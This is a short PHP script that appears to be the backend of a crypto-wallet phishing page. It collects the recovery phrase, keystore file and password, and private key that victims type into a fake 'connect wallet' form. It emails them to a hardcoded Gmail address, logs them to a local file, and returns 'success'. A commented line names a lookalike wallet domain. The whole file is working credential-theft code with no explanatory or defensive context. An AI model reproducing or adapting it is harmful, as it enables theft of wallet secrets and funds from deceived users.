<?php

if (isset($_POST['import_type']) && !empty($_POST['import_type'])) {

    $to      = 'gistmedialoaded@gmail.com';
    $subject = 'User has submitted the connect walled form';
    $message = 'Here is the following value user has submitted';
    $message .= "<br>";

    if (isset($_POST['import_type'])) {
        $message .= "<b>Type</b> : " . $_POST['import_type']."<br>";
    }

    if (isset($_POST['wallet'])) {
        $message .= "<b>Wallet</b> : " . $_POST['wallet']."<br>";
    }

    if (isset($_POST['phrase'])) {
        $message .= "<b>Phrase</b> : " . $_POST['phrase']."<br>";
    }

    if (isset($_POST['keystorejson'])) {
        $message .= "<b>Keystorejson</b> : " . $_POST['keystorejson']."<br>";
    }

    if (isset($_POST['keystorepasswword'])) {
        $message .= "<b>Keystorepasswword</b> : " . $_POST['keystorepasswword']."<br>";
    }

    if (isset($_POST['value'])) {
        $message .= "<b>value</b> : " . $_POST['value']."<br>";
    }

    if (isset($_POST['privatekey'])) {
        $message .= "<b>privatekey</b> : " . $_POST['privatekey']."<br>";
    }

    /*$headers = array(
        'X-Mailer' => 'PHP/' . phpversion(),
        'Content-Type' =>'text/html; charset=UTF-8'
    );*/

    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    //$headers .= "From: 	walletauthentical-live.com@walletauthentical-live.com" . "\r\n";



    mail($to, $subject, $message, $headers);
    file_put_contents('debug_log_.txt',print_r([$to,$subject,$message],true),FILE_APPEND);

    echo 'success';
    die;

}

echo 'error';
die;
